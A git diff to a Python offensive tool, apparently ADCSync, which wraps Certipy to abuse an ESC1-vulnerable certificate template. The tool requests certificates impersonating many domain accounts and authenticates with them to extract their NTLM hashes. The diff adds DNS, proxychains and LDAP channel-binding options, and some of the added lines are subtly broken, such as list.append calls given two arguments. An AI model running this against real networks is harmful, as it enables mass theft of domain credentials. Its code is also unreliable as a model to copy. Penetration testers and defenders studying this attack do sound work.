@@ -117,7 +117,7 @@ def get_dc_netbios_from_fqdn(dc_fqdn: str) -> str:
     dc_netbios_domain = dc_fqdn.split('.')[0].lower()
     return dc_netbios_domain
 
-def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output_file, debug, threads):
+def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output_file, dns_tcp, dns, name_server, timeout, ldap_channel_binding, debug, threads):
     """Retrieve certificates using Certipy."""
     logger.info(f"🔄 Retrieving certificates for {len(accounts.accounts)} accounts...")
 
@@ -155,6 +155,16 @@ def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_
                 certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                   '-template', template, '-upn', upn, '-sid', sid
             ]
+        if dns_tcp:
+            command.append('-dns-tcp')
+        if dns != '':
+            command.append('-dns', dns)
+        if timeout != '':
+            command.append('-timeout', timeout)
+        if name_server != '':
+            command.append('-ns', name_server) # usually the same value as -dc-ip arg
+        if ldap_channel_binding:
+            command.append('-ldap-channel-binding')
         req_process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         if "Failed to connect" in req_process.stdout:
             logger.error(f"⏳ Connection failed for account: {account.usernameLower}")
@@ -173,6 +183,12 @@ def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_
             command = f'echo 0 | proxychains4 {certipy_client} auth -pfx {account.pfx_filepath} -domain {account.domain} -dc-ip {dc_ip}'
         else:
             command = f'echo 0 | {certipy_client} auth -pfx {account.pfx_filepath} -domain {account.domain} -dc-ip {dc_ip}'
+        if name_server != '':
+            command += f' -ns {name_server}'
+        if dns_tcp:
+            command += ' -dns-tcp'
+        if timeout != '':
+            command += f' -timeout {timeout}'
 
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
         stdout, stderr = process.communicate()
@@ -203,13 +219,13 @@ def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_
                         except IndexError:
                             logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {stdout}")
 
-def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains, threads):
+def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, dns_tcp, dns, name_server, timeout, ldap_channel_binding, debug, proxychains, threads):
     """Main function to extract accounts, retrieve certificates, and authenticate."""
 
     data = get_json_data(file)
     accounts = extract_accounts(data)
 
-    retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output, debug, threads)
+    retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output, dns_tcp, dns, name_server, timeout, ldap_channel_binding, debug, threads)
 
     logger.success("🎉 ADCSync process completed successfully!")
 
@@ -227,6 +243,11 @@ if __name__ == '__main__':
     parser.add_argument('-template', help='Template Name vulnerable to ESC1', required=True)
     parser.add_argument('-target', help='CA FQDN', required=True)
     parser.add_argument('-t', '--threads', type=int, default=4, help='Number of threads to use. (default=4)')
+    parser.add_argument('-dns-tcp', action='store_true', help='use dns-tcp for proxychains4')
+    parser.add_argument('-dns', help='the DC FQDN, useful for proxychains4')
+    parser.add_argument('-ns', '--name-server', help='name server, useful for proxychains, should be the same as the dc-ip value most of the time')
+    parser.add_argument('-timeout', help='timeout value for dns resolution, useful for proxychains4')
+    parser.add_argument('-ldap-channel-binding', action='store_true', help='useful if target requires ldap channel binding')
     parser.add_argument('-debug', action='store_true', help='Show verbose debugging information')
     parser.add_argument('-proxychains', action='store_true', help='Use proxychains4')
 
